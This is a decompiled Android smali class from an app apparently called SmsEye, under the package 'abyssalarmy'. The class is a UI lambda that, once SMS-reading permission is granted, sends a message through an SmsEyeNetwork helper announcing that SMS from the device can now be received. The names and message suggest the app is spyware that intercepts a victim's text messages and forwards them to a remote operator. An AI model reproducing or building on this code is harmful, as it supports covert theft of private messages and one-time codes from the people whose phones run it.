.class final Labyssalarmy/smseye2/ui/screen/SmsEyeWebviewKt$SmsEyeWebview$1;
.super Lkotlin/jvm/internal/Lambda;
.source "SmsEyeWebview.kt"

# interfaces
.implements Lkotlin/jvm/functions/Function0;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Labyssalarmy/smseye2/ui/screen/SmsEyeWebviewKt;->SmsEyeWebview(Labyssalarmy/smseye2/SmsEyeViewModel;Landroidx/compose/runtime/Composer;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lkotlin/jvm/internal/Lambda;",
        "Lkotlin/jvm/functions/Function0<",
        "Lkotlin/Unit;",
        ">;"
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    k = 0x3
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field final synthetic $context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWebviewKt$SmsEyeWebview$1;->$context:Landroid/content/Context;

    const/4 p1, 0x0

    invoke-direct {p0, p1}, Lkotlin/jvm/internal/Lambda;-><init>(I)V

    return-void
.end method


# virtual methods
.method public bridge synthetic invoke()Ljava/lang/Object;
    .locals 1

    .line 21
    invoke-virtual {p0}, Labyssalarmy/smseye2/ui/screen/SmsEyeWebviewKt$SmsEyeWebview$1;->invoke()V

    sget-object v0, Lkotlin/Unit;->INSTANCE:Lkotlin/Unit;

    return-object v0
.end method

.method public final invoke()V
    .locals 2

    .line 22
    new-instance v0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;

    iget-object v1, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWebviewKt$SmsEyeWebview$1;->$context:Landroid/content/Context;

    invoke-direct {v0, v1}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;-><init>(Landroid/content/Context;)V

    const-string v1, "Reading sms permission has been granted\nNow you can receive sms from this device!\nIgnore this message if you received it from this device before"

    invoke-virtual {v0, v1}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->sendTextMessage(Ljava/lang/String;)V

    return-void
.end method
